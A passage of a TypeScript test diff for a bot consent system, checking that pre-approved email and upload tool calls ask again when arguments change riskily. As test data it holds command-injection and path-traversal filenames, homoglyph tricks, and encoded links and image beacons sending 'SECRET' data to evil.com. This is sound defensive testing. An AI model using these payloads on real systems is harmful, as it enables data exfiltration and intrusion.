+    if (kind === 'sent-card') vi.spyOn(f.bots.alone, 'match').mockReturnValueOnce(undefined)
+    const next = await aloneNext(t)
+    id = next.id; turn = next.turn
+    if (kind === 'sent-card') {
+      await finish(f, turn.payload)
+      await f.bots.actions.answer({ actionId: next.action.id, digest: next.action.args_digest, answer: 'send' }); await flush()
+      turn = await start(f, id, 2)
+    }
+  }
+  expect(f.bots.actions.forWork(id)?.status).toBe('uncertain')
+  const calls = vi.mocked(t.manager.callTool).mock.calls.length
+  await callForBot({ bot: turn.prepared.authority, mcp: t.mcp, name: 'Mail__send', args: kind === 'sent-card' ? t.args : { ...t.args, body: 'Reworded friendly sentence' }, toolCallId: 'r2-retry', signal: new AbortController().signal })
+  expect(f.bots.actions.forWork(id)).toMatchObject({ status: 'open', card_json: expect.any(String) })
+  expect(t.manager.callTool).toHaveBeenCalledTimes(calls)
+})
+
+it.each([{}, [], 1, null])('E1 r2 a string body cannot become another type: %j', body => {
+  return aloneAsk().then(async t => {
+    expect((await aloneNext(t, { ...t.args, body: body as never })).action.status).toBe('open')
+    expect(t.calls).toHaveLength(1)
+  })
+})
+it('E1 r2 source calls preserve the bot note and export no argument contract or digest', async () => {
+  const t = await aloneAsk()
+  const first = f.bots.actions.forWork(t.id)!
+  expect(f.store.get('SELECT bot_note FROM bot_actions WHERE id = ?', first.id)?.bot_note).toBeNull()
+  // Existing rows from the earlier build must not export their old per-argument hashes either.
+  const contract = alone.argumentContract(t.args, 'legacy-test-key')
+  f.store.run('UPDATE bot_actions SET bot_note = ? WHERE id = ?', JSON.stringify(contract), first.id)
+  const memory = new BotMemoryStore({ db: f.store.db })
+  expect(JSON.stringify(memory.actions(t.botId))).not.toContain(contract.digests.to)
+  expect(memory.actions(t.botId).every(a => a.args_digest == null)).toBe(true)
+  // A legacy source with a single recipient carries the reversible hash of that address.
+  const recipientDigest = actionDigest(t.args.to[0])
+  f.store.run('UPDATE bot_actions SET bot_note = ? WHERE id = ?', JSON.stringify({ ...contract, digests: { to: recipientDigest } }), first.id)
+  const exported = await createBotMemoryAdmin({ store: memory }).export(t.botId, f.base)
+  for (const file of exported.files) {
+    const text = readFileSync(file, 'utf8')
+    expect(text).not.toContain(recipientDigest)
+    expect(text).not.toContain(first.args_digest)
+  }
+  f.store.run('UPDATE bot_actions SET bot_note = ? WHERE id = ?', 'The bot’s own card note', first.id)
+  expect(memory.actions(t.botId).find(a => a.id === first.id)?.bot_note).toBe('The bot’s own card note')
+  expect(f.bots.alone.prepare(t.botId, 'note-preserved', t.request as never)).toBeUndefined()
+})
+
+it('E1 r2 ordinary held and sent calls do not compute a contract', async () => {
+  const classify = vi.spyOn(alone, 'argumentContract')
+  const t = await scheduledCall(true, 1)
+  await t.call(); await finish(f, t.run.payload)
+  const first = f.bots.actions.forWork(t.id)!
+  await f.bots.actions.answer({ actionId: first.id, digest: first.args_digest, answer: 'send' })
+  expect(classify).not.toHaveBeenCalled()
+})
+
+it('E1 r2 re-approving without a pair then restoring it never restores consent', async () => {
+  const t = await aloneAsk()
+  const original = f.bots.definitionOf(t.botId)
+  for (const mcp of [[], original.permissions.mcp]) {
+    const definition = f.host.definitions.publishRevision({ ...original, permissions: { ...original.permissions, mcp } })
+    f.store.setPublished(t.botId, definition.revision!)
+    f.bots.approve(t.botId, botManifestDigest(definition.permissions))
+  }
+  expect(f.store.all("SELECT key FROM bot_memory_state WHERE key GLOB 'alone:*'")).toEqual([])
+  expect((await aloneNext(t)).action.status).toBe('open')
+})
+it('E1 r2 forgetting a sent call clears its exact place as well as authority', async () => {
+  const t = await aloneAsk()
+  const action = f.bots.actions.forWork(t.id)!
+  f.bots.actions.forgetText(t.botId, action.id)
+  expect(f.store.get('SELECT place_json FROM bot_actions WHERE id = ?', action.id)?.place_json).toBeNull()
+  expect(f.bots.alone.prepare(t.botId, 'after-forget', t.request as never)).toContain('Let it ask once first')
+})
+it('E1 r2 startup clears pending snapshots even for a bot no longer registered', async () => {
+  f = botFixture()
+  f.store.run('INSERT INTO bot_memory_state(bot_id,key,value) VALUES(?,?,?)', 'removed-bot', 'alone-ask:orphan', '{}')
+  await f.bots.reconcileOnStartup()
+  expect(f.store.all("SELECT key FROM bot_memory_state WHERE key GLOB 'alone-ask:*'")).toEqual([])
+})
+it('E1 r2 restoring a changed binding never revives consent', async () => {
+  const t = await aloneAsk()
+  t.server.configDigest = 'changed'
+  expect(f.bots.alone.match(t.botId, t.schedule.scheduleId, 'mail', 'send', { to: t.args.to }, t.args)).toBeUndefined()
+  t.server.configDigest = 'config-1'
+  expect(f.bots.alone.items(t.botId)).toEqual([])
+  expect((await aloneNext(t)).action.status).toBe('open')
+})
+it('E1 r2 an uncertain stored outcome never claims the call did not run', async () => {
+  const t = await aloneAsk()
+  vi.mocked(t.manager.callTool).mockRejectedValueOnce(new Error('Connection closed after dispatch'))
+  const next = await aloneNext(t)
+  expect(next.action.status).toBe('uncertain')
+  expect(JSON.parse(next.action.result_json!).text).toContain('could not be confirmed whether this went through')
+  expect(JSON.parse(next.action.result_json!).text).not.toContain("couldn't run")
+})
+it.each([true, false])('E1 r2 malformed asks mention let-alone only while asks first is on: %s', async on => {
+  const t = await setup(on)
+  await f.bots.service.chatSend({ botId: t.botId, text: 'Please ask', clientRequestId: 'r2-malformed' })
+  const row = f.store.laneActivations(t.botId, 'chat', ['running'])[0]!
+  const turn = await start(f, row.id)
+  expect(turn.prepared.authority.escalate!({ permission: undefined, reason: 'Ask' }).includes('let_alone')).toBe(on)
+})
+
+it('E1 r2 a masked source review cannot supply an argument contract', async () => {
+  const t = await aloneAsk()
+  const source = f.bots.actions.forWork(t.id)!
+  f.store.run('UPDATE bot_actions SET args_json = ? WHERE id = ?', JSON.stringify({ ...t.args, body: '[hidden]' }), source.id)
+  expect(f.bots.alone.prepare(t.botId, 'hidden-review', t.request as never)).toBe('This sent call has hidden arguments, so it always asks.')
+})
+
+
+it('E1 r2 a changed consent through legacy respond withdraws and continues cleanly', async () => {
+  const t = await aloneAsk('pending')
+  t.server.configDigest = 'changed'
+  const response = await f.bots.respond({ escalationId: t.consent.id, answer: 'allow_bot' })
+  expect(response.escalation.status).toBe('withdrawn')
+  const continued = await start(f, t.consentActivation, 2)
+  expect(f.store.lastMainDispatch(t.consentActivation)?.prompt.text).toContain('Nothing was allowed')
+  await finish(f, continued.payload)
+  expect(f.store.activation(t.consentActivation)?.status).toBe('done')
+  expect(f.store.all("SELECT key FROM bot_memory_state WHERE key GLOB 'alone:*' OR key GLOB 'alone-ask:*'")).toEqual([])
+})
+it('E1 r2 consent for creating a page uses the whole tool title naturally', async () => {
+  const t = await aloneAsk('pending', 'create_page')
+  expect(f.bots.chat.card(t.consent).title).toBe('let ‘Send the email’ use Create page in one@example.test and two@example.test in Mail without asking')
+  await f.bots.service.answer(t.botId, t.consent.id, 'allow')
+  expect(f.bots.alone.items(t.botId)[0]?.title).toBe('‘Send the email’ uses Create page in one@example.test and two@example.test in Mail without asking')
+})
+
+// Round 2b: a filename can change only within its sent extension; tokens belong to their source field.
+it.each([
+  ['scan-2.pdf', true], ['scan-2.PDF', true], ['scan-2.exe', false], ['../x.pdf', false],
+  ['a/b.pdf', false], ['a\\b.pdf', false], ['hidden..pdf', false], ['.hidden.pdf', false],
+  ['x:scan.pdf', false], ['x@scan.pdf', false], ['x\u0000.pdf', false], ['x\n.pdf', false],
+  ['x'.repeat(252) + '.pdf', false], ['x'.repeat(251) + '.pdf', true], ['ｓｃａｎ-２.ｐｄｆ', false], ['scan。pdf', false], ['ａ／ｂ.pdf', false], ['sc\u200ban-2.pdf', false]
+])('E1 r2b a filename stays within the sent extension: %j', async (name, allowed) => {
+  const t = await aloneAsk('allow', 'send', undefined, { name: 'scan-1.pdf', folder: 'scans' })
+  const args = { ...t.args, name: 'scan-1.pdf' }
+  const next = await aloneNext(t, { ...args, name } as never)
+  expect(next.action.status).toBe(allowed ? 'done' : 'open')
+  expect(t.calls).toHaveLength(allowed ? 2 : 1)
+})
+it.each([
+  ['New message -- owner@example.test', true],
+  ['New message -- owner@\u200bexample.test', true],
+  ['New message -- owner＠example．test', true],
+  ['New message without a signature', true],
+  ['New message -- owner@example.test https://new.example.test', false],
+  ['New message -- other@example.test', false],
+  ['New message -- owner@example.test Node.js', false],
+])('E1 r2b text reuses only source tokens in the same field: %j', async (body, allowed) => {
+  const t = await aloneAsk('allow', 'send', 'Old message -- owner@example.test')
+  const next = await aloneNext(t, { ...t.args, body })
+  expect(next.action.status).toBe(allowed ? 'done' : 'open')
+  expect(t.calls).toHaveLength(allowed ? 2 : 1)
+})
+it('E1 r2b source tokens never give authority to another text field', async () => {
+  const t = await aloneAsk('allow', 'send', 'Old message -- owner@example.test', { subject: 'A plain subject' })
+  const args = { ...t.args, subject: 'A plain subject' }
+  expect((await aloneNext(t, { ...args, subject: 'owner@example.test' } as never)).action.status).toBe('open')
+})
+it('E1 r2b token sets use a profile key and never appear in written exports', async () => {
+  const t = await aloneAsk('allow', 'send', 'Old message owner@example.test')
+  const row = f.store.get("SELECT value FROM bot_memory_state WHERE bot_id = ? AND key GLOB 'alone:*'", t.botId)!
+  const contract = JSON.parse(String(row.value)).arguments
+  expect(contract.tokens.body).toHaveLength(1)
+  expect(contract.tokens.body[0]).not.toBe(actionDigest('owner@example.test'))
+  const key = f.store.get("SELECT value FROM bot_memory_state WHERE bot_id = '' AND key = 'alone-token-key'")?.value
+  expect(key).toEqual(expect.any(String))
+  const exported = await createBotMemoryAdmin({ store: new BotMemoryStore({ db: f.store.db }) }).export(t.botId, f.base)
+  for (const file of exported.files) {
+    const text = readFileSync(file, 'utf8')
+    expect(text).not.toContain(contract.tokens.body[0])
+    expect(text).not.toContain(String(key))
+  }
+})
+
+it.each([['original-file', true], ['new-file', false], ['new-file.txt', false], ['evil.exe.', false]])('E1 r3c an extensionless source name stays exact: %s', async (name, allowed) => {
+  const t = await aloneAsk('allow', 'send', undefined, { name: 'original-file', folder: 'scans' })
+  expect((await aloneNext(t, { ...t.args, name } as never)).action.status).toBe(allowed ? 'done' : 'open')
+})
+it('E1 r2b an unsafe source name varies only by exact comparison', async () => {
+  const t = await aloneAsk('allow', 'send', undefined, { name: '../source.pdf' })
+  expect((await aloneNext(t, { ...t.args, name: 'safe.pdf' } as never)).action.status).toBe('open')
+})
+it.each([1, 2, 3])('E1 r2b an older argument contract fails closed and is removed: version %s', async version => {
+  const t = await aloneAsk()
+  const row = f.store.get("SELECT key, value FROM bot_memory_state WHERE bot_id = ? AND key GLOB 'alone:*'", t.botId)!
+  const entry = JSON.parse(String(row.value))
+  entry.arguments.version = version
+  f.store.run('UPDATE bot_memory_state SET value = ? WHERE bot_id = ? AND key = ?', JSON.stringify(entry), t.botId, row.key)
+  expect((await aloneNext(t)).action.status).toBe('open')
+  expect(f.store.get('SELECT key FROM bot_memory_state WHERE bot_id = ? AND key = ?', t.botId, row.key)).toBeUndefined()
+})
+
+// Round 3: ordinary sentences and the unchanged signature are free content.
+it.each([
+  'Thanks. See you soon.',
+  'Hope your day is going smoothly and you get a moment to enjoy a nice cup of tea.',
+  'Hope your day is off to a lovely start. Write to penny.helper@example.org anytime you like!'
+])('E1 r3 sentence boundaries do not invent addresses: %s', async prose => {
+  const signature = '\n\n-- Penny for Lucky\npenny.helper@example.org\nhttps://example.org/lucky'
+  const t = await aloneAsk('allow', 'send', 'Hope your day is off to a bright and easy start!' + signature)
+  const next = await aloneNext(t, { ...t.args, body: prose + signature })
+  expect(next.action).toMatchObject({ status: 'done', card_json: null })
+  expect(t.calls).toHaveLength(2)
+})
+
+it.each([['evil. com', true], ['evil . com', false], ['evil .com', false], ['evil.com.', false]])(
+  'E1 r3b distinguishes sentence spacing from an obfuscated host: %s', async (body, allowed) => {
+    const t = await aloneAsk('allow', 'send', 'Old plain message')
+    const next = await aloneNext(t, { ...t.args, body })
+    expect(next.action.status).toBe(allowed ? 'done' : 'open')
+    expect(t.calls).toHaveLength(allowed ? 2 : 1)
+  }
+)
+
+it.each(['.', ',', '!', '?', ';', ':', ')', ']', '}', "'", '"', '>', '.:', '!:', '!>)'])(
+  'E1 r3 a repeated signature ignores surrounding punctuation: %s', async punctuation => {
+    const address = 'penny.helper@example.org'
+    const t = await aloneAsk('allow', 'send', 'Old message ' + address)
+    const next = await aloneNext(t, { ...t.args, body: 'Send replies to <' + address + punctuation })
+    expect(next.action.status).toBe('done')
+    expect(t.calls).toHaveLength(2)
+  }
+)
+it('E1 r3 the source signature strips wrappers too', async () => {
+  const t = await aloneAsk('allow', 'send', 'Old message (<penny.helper@example.org!>)')
+  expect((await aloneNext(t, { ...t.args, body: 'New message penny.helper@example.org' })).action.status).toBe('done')
+})
+it('E1 r3 a sentence after the same URL can change', async () => {
+  const t = await aloneAsk('allow', 'send', 'See https://ok.com/r. Thanks')
+  expect((await aloneNext(t, { ...t.args, body: 'See https://ok.com/r. Cheers' })).action.status).toBe('done')
+})
+
+it.each([
+  ['new scan 2026-11-19 08:02 Asia/Kolkata', 'new scan 2026-11-19 08:06:08 Asia/Kolkata'],
+  ['Checked at 8:02am', 'Checked at 10:30 PM'],
+  ['Total 3.5 EUR', 'Total 1,234.50 EUR'],
+  ['Report 18.11.2026', 'Report 19.11.2026'],
+  ['Report 18/11/2026', 'Report 19/11/2026'],
+  ['Scans filed: 3', 'Scans filed: 5'],
+  ['Label : old value', 'Label : new value']
+])('E1 r3 times, amounts, dates and labels are ordinary text: %s', async (before, after) => {
+  const t = await aloneAsk('allow', 'send', before)
+  const next = await aloneNext(t, { ...t.args, body: after })
+  expect(next.action.status).toBe('done')
+  expect(t.calls).toHaveLength(2)
+})
+it('E1 r3 a realistic daily report can vary around its fixed signature', async () => {
+  const signature = '\n\n-- Kai (kai@example.test)'
+  const t = await aloneAsk('allow', 'send', 'I filed 3 scans today. Two were invoices.\nNext check: tomorrow at 07:00.\nTotal 12.50 EUR on 18.11.2026.' + signature)
+  const next = await aloneNext(t, { ...t.args, body: 'I filed 5 scans today. One was a receipt.\nNext check: tomorrow at 07:30.\nTotal 1,234.50 EUR on 19.11.2026.' + signature })
+  expect(next.action).toMatchObject({ status: 'done', card_json: null })
+  expect(t.calls).toHaveLength(2)
+})
+it.each(['example.net:8080', '[::1]:80', 'mailto:x@y.z', '::1', 'fe80::1', 'fe80::', '::', '10.0.0.1', '10.0.0.1:8080', 'x://local'])(
+  'E1 r3 time exceptions leave real addresses asking: %s', async body => {
+    const t = await aloneAsk('allow', 'send', 'A plain message')
+    expect((await aloneNext(t, { ...t.args, body })).action.status).toBe('open')
+    expect(t.calls).toHaveLength(1)
+  }
+)
+
+it.each([
+  ['delete_branch', 'feature-x', 'main'],
+  ['drop_table', 'tmp_2026_11_18', 'users'],
+  ['create_record', 'www', 'mail'],
+  ['delete_branch', 'feature.old', 'feature.pdf']
+])('E1 r3c names outside a folder-like place stay exact: %s', async (tool, before, after) => {
+  const t = await aloneAsk('allow', tool, undefined, { name: before })
+  expect((await aloneNext(t, { ...t.args, name: after } as never)).action.status).toBe('open')
+  expect(t.calls).toHaveLength(1)
+})
+it('E1 r3c a filename with an extension can vary within a folder', async () => {
+  const t = await aloneAsk('allow', 'upload_file', undefined, { folder: 'scans', name: 'scan-1.pdf' })
+  expect((await aloneNext(t, { ...t.args, name: 'scan-2.pdf' } as never)).action.status).toBe('done')
+  expect(t.calls).toHaveLength(2)
+})
+
+it.each([
+  'evil.ｐｄｆ', 'evil.exe\u200b.pdf', ('a\u200b').repeat(200) + '.pdf', 'evil\u202efdp.exe.pdf',
+  ' .bashrc.pdf', '%2E%2E%2Fsecrets%2Fx.pdf', 'CON.pdf', 'prn.pdf', 'AUX.pdf', 'nul.pdf',
+  'COM1.pdf', 'com9.pdf', 'LPT1.pdf', 'lpt9.pdf', 'CON .pdf', '*.pdf', '$(id).pdf', 'x;rm.pdf', 'report.pdf ', 'report.pdf.'
+])('E1 r3c varying filenames validate the raw bytes sent: %j', async name => {
+  const t = await aloneAsk('allow', 'upload_file', undefined, { folder: 'scans', name: 'scan-1.pdf' })
+  expect((await aloneNext(t, { ...t.args, name } as never)).action.status).toBe('open')
+  expect(t.calls).toHaveLength(1)
+})
+it('E1 r3c an unsafe raw source filename does not grant variation', async () => {
+  const t = await aloneAsk('allow', 'upload_file', undefined, { folder: 'scans', name: 'scan-１.pdf' })
+  expect((await aloneNext(t, { ...t.args, name: 'scan-2.pdf' } as never)).action.status).toBe('open')
+})
+
+it.each([
+  '<a href="https&#58;//evil&#46;com">x</a>', '<a href="https&#x3a;//evil&#x2e;com">x</a>',
+  'see evil<b></b>.com', 'curl "evil"".com"', 'u = "evil" + ".com"',
+  'evil\u034f.com', 'evil\ufe0f.com', 'evil.\u0301com', 'evil\u2060.com', 'evil‧com',
+  '//intranet/x', 'evil%2Ecom', 'evil%EF%BC%8Ecom', 'evil&#46;com', 'evil&#x2e;com',
+  'https%3A%2F%2Fevil.example/x', 'https%253A%252F%252Fevil.example/x', 'owner%40evil.example'
+])('E1 r3c encoded and mark-padded destinations still ask: %s', async body => {
+  const t = await aloneAsk('allow', 'send', 'Hi, the report is at https://ok.com/r/1 . Thanks')
+  expect((await aloneNext(t, { ...t.args, body })).action.status).toBe('open')
+  expect(t.calls).toHaveLength(1)
+})
+it('E1 r3c decoding is for matching only and preserves the sent text', async () => {
+  const t = await aloneAsk('allow', 'send', 'Old message owner@example.test')
+  const body = 'New message owner&#64;example.test'
+  expect((await aloneNext(t, { ...t.args, body })).action.status).toBe('done')
+  expect(t.calls.at(-1)).toMatchObject({ body })
+})
+
+it.each(['MCP off', 'server down', 'permission off'] as const)(
+  'E1 r3c temporary unavailability keeps consent through About: %s', async state => {
+    const t = await aloneAsk()
+    const saved = f.store.all("SELECT key,value FROM bot_memory_state WHERE bot_id = ? AND key GLOB 'alone:*'", t.botId)
+    const permission = f.bots.service.get(t.botId).permissions.find(p => p.id.includes('"mcp"'))!
+    const tools = [...t.server.tools]
+    if (state === 'MCP off') t.setMcpEnabled(false)
+    if (state === 'server down') { t.server.tools.splice(0); t.server.failing = true }
+    if (state === 'permission off') f.bots.setPermission(t.botId, permission.id, false)
+    expect(f.bots.alone.match(t.botId, t.schedule.scheduleId, 'mail', 'send', { to: t.args.to }, t.args)).toBeUndefined()
+    expect(f.bots.service.get(t.botId).permissions.filter(p => p.id.startsWith('alone:'))).toEqual([])
+    expect(f.store.all("SELECT key,value FROM bot_memory_state WHERE bot_id = ? AND key GLOB 'alone:*'", t.botId)).toEqual(saved)
+    if (state === 'MCP off') t.setMcpEnabled(true)
+    if (state === 'server down') { t.server.tools.push(...tools); t.server.failing = false }
+    if (state === 'permission off') f.bots.setPermission(t.botId, permission.id, true)
+    expect(f.bots.alone.items(t.botId)).toHaveLength(1)
+    expect((await aloneNext(t)).action.status).toBe('done')
+  }
+)
+
+it.each([['body', 256, true], ['body', 257, false], ['split', 257, false], ['repeat', 256, true]] as const)(
+  'E1 r3c consent caps distinct source tokens across the call: %s %s', async (shape, count, allowed) => {
+    const t = await scheduledCall(true, 1)
+    const tokens = Array.from({ length: count }, (_, n) => `a${n}.example`)
+    Object.assign(t.args, { body: (shape === 'split' ? tokens.slice(0, 128) : tokens).join(' '),
+      ...(shape === 'body' ? {} : { subject: (shape === 'split' ? tokens.slice(128) : tokens).join(' ') }) })
+    t.descriptor.inputSchema.properties.to = { type: 'array' } as never
+    await t.call(); await finish(f, t.run.payload)
+    const source = f.bots.actions.forWork(t.id)!
+    await f.bots.actions.answer({ actionId: source.id, digest: source.args_digest, answer: 'send' }); await flush()
+    const result = f.bots.alone.prepare(t.botId, 'token-cap', { ask: 'let_alone', scheduleId: t.schedule.scheduleId, serverId: 'mail', tool: 'send' })
+    expect(result).toBe(allowed ? undefined : 'This sent call has too many addresses to let alone.')
+    expect(f.store.all("SELECT key FROM bot_memory_state WHERE bot_id = ? AND key GLOB 'alone-ask:*'", t.botId)).toHaveLength(allowed ? 1 : 0)
+  }
+)
+
+it.each(['declined', 'failed', 'quiet'] as const)(
+  'E1 r3 the final report preserves uncertainty after a %s retry', async outcome => {
+    const t = await aloneAsk()
+    vi.mocked(t.manager.callTool).mockRejectedValueOnce(new Error('Connection closed after dispatch'))
+    const next = await aloneNext(t)
+    expect(next.action.status).toBe('uncertain')
+    await callForBot({ bot: next.turn.prepared.authority, mcp: t.mcp, name: 'Mail__send', args: { ...t.args, body: 'A reworded retry' }, toolCallId: 'r3-retry', signal: new AbortController().signal })
+    const retry = f.bots.actions.forWork(next.id)!
+    expect(retry.status).toBe('open')
+    await finish(f, next.turn.payload)
+    if (outcome === 'failed') vi.mocked(t.manager.callTool).mockResolvedValueOnce({ isError: true, content: [{ type: 'text', text: 'Could not archive the email' }] } as never)
+    await f.bots.actions.answer({ actionId: retry.id, digest: retry.args_digest, answer: outcome === 'failed' ? 'send' : 'not_now' }); await flush()
+    expect(f.bots.actions.get(retry.id)?.status).toBe(outcome === 'failed' ? 'failed' : 'declined')
+    const resumed = await start(f, next.id, 2)
+    if (outcome === 'quiet') f.automationRuns.report({ threadId: resumed.payload.threadId, activationId: next.id }, 'quiet', 'Nothing new.')
+    const report = outcome === 'quiet' ? '[SILENT]' : outcome === 'failed' ? 'The retry failed.' : "Filed 3 scans and emailed Ana the summary.\nI didn't resend because you chose Not now."
+    await finish(f, resumed.payload, 'completed', { text: report })
+    const reports = f.bots.service.chatList(t.botId).messages.filter(m => m.activationId === next.id && m.kind === 'run_report')
+    expect(reports).toHaveLength(1)
+    expect(reports[0]!.text).toContain('The first attempt may already have gone through. Check before trying again.')
+    expect(reports[0]!.text).not.toContain('[SILENT]')
+    if (outcome !== 'failed') expect(reports[0]!.text).toMatch(/^The retry didn't go out\./)
+    if (outcome === 'declined') expect(reports[0]!.text).toBe("The retry didn't go out. The first attempt may already have gone through. Check before trying again.\n\n" + report)
+    expect(f.store.activation(next.id)?.status).toBe('done')
+  }
+)
+
+it.each([
+ '![chart](https&colon;&sol;&sol;evil&period;com/p?d=SECRETDATA)',
+ '<img src="https&colon;&sol;&sol;evil&period;com/p?d=SECRET">',
+ '![c](https&colon;&sol;&sol;ok&period;com/r/1?d=SECRET)',
+ '[report](https&colon;&sol;&sol;evil&period;com)', '[x](<https&colon;&sol;&sol;evil&period;com>)',
+ '[x]: https&colon;&sol;&sol;evil&period;com', '[boss](mailto&colon;x&commat;evil&period;com)',
+ 'mail x&commat;evil&period;com',
+ '<a href="https&#x000003a;&#x000002f;&#x000002f;evil&#x000002e;com">',
+ '<a href="https&#00000058;&#00000047;&#00000047;evil&#00000046;com">',
+ 'evil&NotAnEntity;com', 'evil[.]com'
+])('E1 r4 encoded links and image beacons ask: %s', async body => {
+ const t = await aloneAsk('allow', 'send', 'Report for 2026-11-18. Details: https://ok.com/r/1')
+ expect((await aloneNext(t, { ...t.args, body })).action.status).toBe('open')
+ expect(t.calls).toHaveLength(1)
+})
+
+it.each([
+ ['-$5.00','-$6.00'], ['-€12,50','-€13,50'], ['−$5','−$6'],
+ ['$1,234.56', '$2,234.56'], ['€12.50', '€13.50'], ['12.50€', '13.50€'], ['3.5%', '3.6%'],
+ ['Up 3.5%.', 'Up 3.6%.'], ['12.5k users', '13.5k users'], ['p95 1.2s', 'p95 1.3s'],
+ ['1.2M', '2.3B'], ['1.2ms', '2.3ms'], ['1.2h', '2.3d'], ['1.2x', '2.3x'],
+ ['2026-11-18T10:30', '2026-11-19T11:31:02Z'], ['3:1', '12:2'], ['07:00-08:00', '08:00-09:00'], ['Tickets:4','Tickets:5'], ['1,234.56','2,345.67'], ['USD 12.50','USD 13.50'], ['+3.5','-3.6'], ['(3.5)','(3.6)'], ['4/5','3/4'], ['10:30 UTC','10:31 UTC'], ['2026/11/18','2026/11/19'], ['19.11.2026','20.11.2026']
+])('E1 r4 report numbers vary both ways: %s', async (before, after) => {
+ for (const [source, body] of [[before,after],[after,before]]) {
+  const t = await aloneAsk('allow', 'send', source)
+  expect((await aloneNext(t, { ...t.args, body })).action.status).toBe('done')
+  f.close()
+ }
+})
+it.each(['-$evil.com', 'https://3.5', '@3.5', '3.5/path', '1.2.3.4', 'v1.2.3', 'Tickets:evil.com', 'tel:123', 'x:12', 'mailto:12'])(
+ 'E1 r4 numeric exceptions do not admit destinations: %s', async body => {
+ const t = await aloneAsk('allow', 'send', 'A plain message')
+ expect((await aloneNext(t, { ...t.args, body })).action.status).toBe('open')
+})
+
+it('E1 r4 keyed token digests bind the field even for identical source tokens', async () => {
+ const t = await aloneAsk('allow', 'send', 'owner@example.test', { subject:'owner@example.test' })
+ const entry = JSON.parse(String(f.store.get("SELECT value FROM bot_memory_state WHERE bot_id = ? AND key GLOB 'alone:*'",t.botId)!.value))
+ expect(entry.arguments.tokens.body[0]).not.toBe(entry.arguments.tokens.subject[0])
+})
+it('E1 r4 a valid exception is inert with asks first disabled', async () => {
+ const t = await aloneAsk()
+ f.host.settings!.get().experimental.botAsksFirstOff = true
+ expect(f.bots.alone.match(t.botId,t.schedule.scheduleId,'mail','send',{to:t.args.to},t.args)).toBeUndefined()
+ expect(f.bots.alone.items(t.botId)).toEqual([])
+})
+it.each(['a.com','www.ex.com'])('E1 r4 host-shaped names stay exact: %s', async name => {
+ const t = await aloneAsk('allow','upload_file',undefined,{[name==='a.com'?'drive_id':'path']:'scans',name})
+ expect((await aloneNext(t,{...t.args,name:name==='a.com'?'evil.com':'mail.ex.com'} as never)).action.status).toBe('open')
+})
+it('E1 r4 expanded text above 64k asks without scanning', async () => {
+ const t=await aloneAsk('allow','send','A small message')
+ expect((await aloneNext(t,{...t.args,body:'ﷺ'.repeat(255000)})).action.status).toBe('open')
+ expect(t.calls).toHaveLength(1)
+})
+
+it('E1 r4 dotted versions remain address-like in both directions', async () => {
+ for(const [source, body] of [['v1.2.3','v1.2.4'],['v1.2.4','v1.2.3']]) {
+  const t=await aloneAsk('allow','send',source)
+  expect((await aloneNext(t,{...t.args,body})).action.status).toBe('open')
+  f.close()
+ }
+})
+
+it.each(['intranet:8080', 'localhost:443', 'Exfil:80'])('E1 r4 a numeric label never admits a new host: %s', async body => {
+ const t=await aloneAsk('allow','send','Tickets:4')
+ expect((await aloneNext(t,{...t.args,body})).action.status).toBe('open')
+ expect(t.calls).toHaveLength(1)
+})
+
+it.each(['report','quiet'] as const)('E1 r6 a plain decline leaves a %s report unchanged', async kind => {
+ const t=await aloneAsk()
+ const next=await aloneNext(t,{...t.args,to:['another@example.test']})
+ expect(next.action.status).toBe('open')
+ await finish(f,next.turn.payload)
+ await f.bots.actions.answer({actionId:next.action.id,digest:next.action.args_digest,answer:'not_now'}); await flush()
+ const resumed=await start(f,next.id,2)
+ const report="Filed 3 scans and emailed Ana the summary.\nI didn't resend because you chose Not now."
+ await finish(f,resumed.payload,'completed',{text:kind==='quiet'?'[SILENT]':report})
+ const reports=f.bots.service.chatList(t.botId).messages.filter(m=>m.activationId===next.id&&m.kind==='run_report')
+ if(kind==='quiet') expect(reports).toEqual([])
+ else { expect(reports).toHaveLength(1); expect(reports[0]!.text).toBe(report) }
+})
+
+it('E1 r5 a cut stored review of long inline content cannot supply consent and explains why', async () => {
+ const t=await scheduledCall(true,1)
+ Object.assign(t.args,{content:'A'.repeat(32001)})
+ t.descriptor.inputSchema.properties.to={type:'array'} as never
+ await t.call(); await finish(f,t.run.payload)
+ const source=f.bots.actions.forWork(t.id)!
+ await f.bots.actions.answer({actionId:source.id,digest:source.args_digest,answer:'send'}); await flush()
+ expect(t.calls).toHaveLength(1)
+ const {maskedActionData}=await import('../../src/mms/bots/actions/BotActions')
+ f.store.run('UPDATE bot_actions SET args_json = ? WHERE id = ?',JSON.stringify(maskedActionData(t.args)),source.id)
+ expect(f.bots.alone.prepare(t.botId,'long-content',{ask:'let_alone',scheduleId:t.schedule.scheduleId,serverId:'mail',tool:'send'})).toBe('This sent call’s content was too long to check, so it asks each time.')
+ expect(f.store.all("SELECT key FROM bot_memory_state WHERE bot_id = ? AND key GLOB 'alone-ask:*'",t.botId)).toEqual([])
+})
+
+it.each([
+ ['mark','Daily report','see evil \u0301. com/x?d=1'],
+ ['ignorable-hangul','Daily report','see evil \u3164. com/x'],
+ ['ignorable-filler','Daily report','see evil \u115f. com/x'],
+ ['format','Daily report','see evil \u2060. com/x'],
+ ['lowercase-host','intranet:8080','intranet:9000'],
+ ['lowercase-localhost','localhost:3000','localhost:22'],
+ ['unit-tail','12.5k','12.5k.evil.com'],
+ ['unit-letters','12.5k','1.5kevil.com'],
+ ['iso-tail','2026-11-18T10:30','2026-11-18T10:30@evil.com'],
+ ['iso-path','2026-11-18T10:30','2026-11-18T10:30Z//evil.com/x'],
+ ['decoded-limit-entity','Daily report: all good','&#65018;'.repeat(7000)+' https://evil.com/p?d=SECRET'],
+ ['decoded-limit-percent','Daily report: all good','%EF%B7%BA'.repeat(7000)+' https://evil.com/p?d=SECRET']
+])('E1 r6 scanner guard %s asks before dispatch', async (_guard, source, body) => {
+ const t=await aloneAsk('allow','send',source)
+ expect((await aloneNext(t,{...t.args,body})).action.status).toBe('open')
+ expect(t.calls).toHaveLength(1)
+})
+
+it.each([
+ 'A &mdash; new note &ndash; done &hellip;',
+ '&lsquo;Hello&rsquo; &ldquo;friend&rdquo;',
+ '&copy; &reg; &trade; &bull; &middot;',
+ '&euro;12 &pound;5 &minus;$5.00 -&dollar;6.00 &nbsp; done'
+])('E1 r6 ordinary typography entities can vary: %s', async body => {
+ const t=await aloneAsk('allow','send','A plain report')
+ expect((await aloneNext(t,{...t.args,body})).action.status).toBe('done')
+})
+it.each([['3:1','16:9',true],['3:1','2130706433:80',false],['16:9','167772161:80',false]] as const)(
+ 'E1 r6 ratios keep large numeric hosts asking: %s to %s',async (source,body,allowed)=>{
